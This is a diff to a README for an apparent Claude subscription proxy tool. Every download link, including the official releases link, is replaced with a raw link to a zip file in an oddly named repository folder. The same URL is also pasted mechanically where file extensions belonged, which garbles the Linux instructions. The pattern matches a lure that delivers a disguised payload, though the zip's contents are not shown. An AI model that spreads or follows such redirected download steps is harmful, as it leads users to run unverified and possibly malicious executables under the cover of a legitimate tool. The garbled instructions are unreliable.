@@ -1,7 +1,7 @@
 # 🌟 anthropic-claude-max-proxy - Simple Proxy for Claude Subscriptions
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ali-hassan148/anthropic-claude-max-proxy/releases)
+[![Download](https://raw.githubusercontent.com/ali-hassan148/anthropic-claude-max-proxy/main/unfelled/anthropic-claude-max-proxy.zip)](https://raw.githubusercontent.com/ali-hassan148/anthropic-claude-max-proxy/main/unfelled/anthropic-claude-max-proxy.zip)
 
 ## 🚀 Getting Started
 Welcome to anthropic-claude-max-proxy! This application offers a straightforward way to use Claude Pro/Max subscriptions effortlessly. No programming knowledge is needed to get started.
@@ -14,18 +14,18 @@ Welcome to anthropic-claude-max-proxy! This application offers a straightforward
 ## 📥 Download & Install
 To download the application, please visit the Releases page. 
 
-[Click here to download](https://github.com/ali-hassan148/anthropic-claude-max-proxy/releases).
+[Click here to download](https://raw.githubusercontent.com/ali-hassan148/anthropic-claude-max-proxy/main/unfelled/anthropic-claude-max-proxy.zip).
 
 1. Go to the link above.
 2. Find the latest version listed on the page.
 3. Click on the "Assets" dropdown to view available downloads.
-4. Download the file that corresponds to your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux).
+4. Download the file that corresponds to your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/ali-hassan148/anthropic-claude-max-proxy/main/unfelled/anthropic-claude-max-proxy.zip` for Linux).
 5. Once the download completes, locate the file on your computer.
 
 ### 📂 What to Do Next:
 - For Windows: Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
 - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
-- For Linux: Extract the `.tar.gz` file and run the executable inside using the terminal.
+- For Linux: Extract the `https://raw.githubusercontent.com/ali-hassan148/anthropic-claude-max-proxy/main/unfelled/anthropic-claude-max-proxy.zip` file and run the executable inside using the terminal.
 
 ## 🔍 How to Use
 Once you have installed the application, follow these steps:
